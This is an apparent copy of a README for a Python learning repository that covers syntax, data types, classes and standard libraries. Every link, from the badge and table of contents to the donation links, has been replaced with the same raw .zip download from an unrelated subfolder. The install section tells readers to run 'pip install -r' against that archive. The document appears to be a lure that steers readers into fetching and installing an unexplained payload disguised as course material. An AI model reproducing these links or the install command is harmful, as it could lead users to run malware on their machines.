# Playground and Cheatsheet for Learning Python

[![Build Status](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)

> This is a collection of Python scripts that are split by [topics](#table-of-contents) and contain 
code examples with explanations, different use cases and links to further readings.

_Read this in_ [_Português_](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip).

It is a **playground** because you may change or add the code to see how it works 
and [test it out](#testing-the-code) using assertions. It also allows you 
to [lint the code](#linting-the-code) you've wrote and check if it fits to Python code style guide.
Altogether it might make your learning process to be more interactive and it might help you to keep 
code quality pretty high from very beginning.

It is a **cheatsheet** because you may get back to these code examples once you want to recap the 
syntax of [standard Python statements and constructions](#table-of-contents). Also because the 
code is full of assertions you'll be able to see expected functions/statements output right away
without launching them.

> _You might also be interested in 🤖 [Interactive Machine Learning Experiments](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)_

## How to Use This Repository

Each Python script in this repository has the following structure:

```python
"""Lists  <--- Name of the topic here

# @see: https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip  <-- Link to further readings goes here

Here might go more detailed explanation of the current topic (i.e. general info about Lists).
"""


def test_list_type():
    """Explanation of sub-topic goes here.
    
    Each file contains test functions that illustrate sub-topics (i.e. lists type, lists methods).
    """
    
    # Here is an example of how to build a list.  <-- Comments here explain the action
    squares = [1, 4, 9, 16, 25]
    
    # Lists can be indexed and sliced. 
    # Indexing returns the item.
    assert squares[0] == 1  # <-- Assertions here illustrate the result.
    # Slicing returns a new list.
    assert squares[-3:] == [9, 16, 25]  # <-- Assertions here illustrate the result.
```

So normally you might want to do the following:

- [Find the topic](#table-of-contents) you want to learn or recap.
- Read comments and/or documentation that is linked in each script's docstring (as in example above). 
- Look at code examples and assertions to see usage examples and expected output.
- Change code or add new assertions to see how things work.
- [Run tests](#testing-the-code) and [lint the code](#linting-the-code) to see if it work and is 
written correctly.

## Table of Contents

1. **Getting Started**
    - [What is Python](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Python Syntax](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Variables](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
2. **Operators**
    - [Arithmetic Operators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`+`, `-`, `*`, `/`, `//`, `%`, `**`)
    - [Bitwise Operators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`&`, `|`, `^`, `>>`, `<<`, `~`)
    - [Assignment Operators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`=`, `+=`, `-=`, `/=`, `//=` etc.)
    - [Comparison Operator](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`==`, `!=`, `>`, `<`, `>=`, `<=`)
    - [Logical Operators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`and`, `or`, `not`)
    - [Identity Operators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`is`, `is not`)
    - [Membership Operators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`in`, `not in`)
3. **Data Types**
    - [Numbers](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (including booleans)
    - [Strings](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) and their methods
    - [Lists](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) and their methods (including list comprehensions)
    - [Tuples](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Sets](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) and their methods
    - [Dictionaries](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Type Casting](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
4. **Control Flow**
    - [The `if` statement](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [The `for` statement](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (and `range()` function)
    - [The `while` statement](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [The `try` statements](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [The `break` statement](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [The `continue` statement](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
5. **Functions**
    - [Function Definition](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`def` and `return` statements)
    - [Scopes of Variables Inside Functions](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`global` and `nonlocal` statements)
    - [Default Argument Values](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Keyword Arguments](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Arbitrary Argument Lists](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Unpacking Argument Lists](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`*` and `**` statements)
    - [Lambda Expressions](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`lambda` statement)
    - [Documentation Strings](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Function Annotations](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Function Decorators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
6. **Classes**
    - [Class Definition](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`class` statement)
    - [Class Objects](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Instance Objects](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Method Objects](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Class and Instance Variables](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Inheritance](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Multiple Inheritance](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
7. **Modules**
    - [Modules](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`import` statement)
    - [Packages](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
8. **Errors and Exceptions**
    - [Handling Exceptions](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`try` statement)
    - [Raising Exceptions](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`raise` statement) 
9. **Files**
    - [Reading and Writing](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`with` statement)
    - [Methods of File Objects](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
10. **Additions**
    - [The `pass` statement](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)
    - [Generators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`yield` statement)
11. **Brief Tour of the Standard Libraries**
    - [Serialization](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`json` library)
    - [File Wildcards](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`glob` library)
    - [String Pattern Matching](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`re` library)
    - [Mathematics](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`math`, `random`, `statistics` libraries)
    - [Dates and Times](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`datetime` library)
    - [Data Compression](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) (`zlib` library)

## Prerequisites

**Installing Python**

Make sure that you have [Python3 installed](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) on your machine.

You might want to use [venv](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) standard Python library
to create virtual environments and have Python, pip and all dependent packages to be installed and 
served from the local project directory to avoid messing with system wide packages and their 
versions.

Depending on your installation you might have access to Python3 interpreter either by
running `python` or `python3`. The same goes for pip package manager - it may be accessible either
by running `pip` or `pip3`.

You may check your Python version by running:

```bash
python --version
```

Note that in this repository whenever you see `python` it will be assumed that it is Python **3**.

**Installing dependencies**

Install all dependencies that are required for the project by running:

```bash
pip install -r https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip
```

## Testing the Code

Tests are made using [pytest](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) framework.

You may add new tests for yourself by adding files and functions with `test_` prefix
(i.e. `https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip` with `def test_sub_topic()` function inside).

To run all the tests please execute the following command from the project root folder:

```bash
pytest
```

To run specific tests please execute:

```bash
pytest https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip
```

## Linting the Code

Linting is done using [pylint](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) and [flake8](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) libraries.

### PyLint

To check if the code is written with respect
to [PEP 8](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) style guide please run:

```bash
pylint ./src/
```

In case if linter will detect error (i.e. `missing-docstring`) you may want to read more about 
specific error by running:

```bash
pylint --help-msg=missing-docstring
```

[More about PyLint](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)

### Flake8

To check if the code is written with respect
to [PEP 8](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) style guide please run:

```bash
flake8 ./src
```

Or if you want to have more detailed output you may run:

```bash
flake8 ./src --statistics --show-source --count
```

[More about Flake8](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip)

## Supporting the project

You may support this project via ❤️️ [GitHub](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip) or ❤️️ [Patreon](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/src/standard_libraries/glob_files/python_learn_1.3.zip).
